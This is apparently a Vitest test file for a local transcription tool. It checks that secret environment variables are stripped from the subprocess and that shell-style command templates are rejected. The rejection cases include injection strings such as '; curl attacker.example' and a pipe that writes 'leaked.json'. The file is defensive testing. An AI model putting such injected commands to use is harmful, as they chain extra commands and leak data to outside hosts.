import { describe, expect, it } from 'vitest';
import { buildTranscribeCommandEnvironment, parseTranscribeCommandTemplate } from '../src/processing/transcribe';

describe('ambiente do transcritor local', () => {
  it('não herda segredos do processo principal', () => {
    const env = buildTranscribeCommandEnvironment(
      {
        PATH: '/usr/bin',
        HOME: '/home/node',
        XDG_CACHE_HOME: '/home/node/.cache',
        DISCORD_TOKEN: 'discord-secret',
        MCP_SECRET: 'mcp-secret',
        COOKIE_SECRET: 'cookie-secret',
        GROQ_API_KEY: 'provider-secret',
        CUDA_VISIBLE_DEVICES: '0',
      },
      [],
    );
    expect(env).toEqual({ PATH: '/usr/bin', HOME: '/home/node', XDG_CACHE_HOME: '/home/node/.cache' });
  });

  it('entrega somente extras autorizados pelo operador', () => {
    const env = buildTranscribeCommandEnvironment(
      { PATH: '/usr/bin', CUDA_VISIBLE_DEVICES: '0', OMP_NUM_THREADS: '4', DISCORD_TOKEN: 'secret' },
      ['CUDA_VISIBLE_DEVICES', 'OMP_NUM_THREADS'],
    );
    expect(env).toEqual({ PATH: '/usr/bin', CUDA_VISIBLE_DEVICES: '0', OMP_NUM_THREADS: '4' });
  });
});

describe('template do transcritor local', () => {
  it('preserva argumentos entre aspas sem entregar o comando a um shell', () => {
    expect(
      parseTranscribeCommandTemplate('python3 "./scripts/meu transcritor.py" --model small {input} {output}'),
    ).toEqual({
      executable: 'python3',
      args: ['./scripts/meu transcritor.py', '--model', 'small', '{input}', '{output}'],
    });
  });

  it.each([
    'python3 worker.py {input} {output}; curl attacker.example',
    'python3 worker.py {input} {output} | tee leaked.json',
    'python3 worker.py $HOME {input} {output}',
    'python3 worker-*.py {input} {output}',
    'python3 "worker.py {input} {output}',
    'python3 worker.py --input={input} {output}',
    'python3 worker.py {input} {input} {output}',
    'CUDA_VISIBLE_DEVICES=0 python3 worker.py {input} {output}',
  ])('rejeita sintaxe ambígua ou executável pelo shell: %s', (template) => {
    expect(() => parseTranscribeCommandTemplate(template)).toThrow();
  });
});
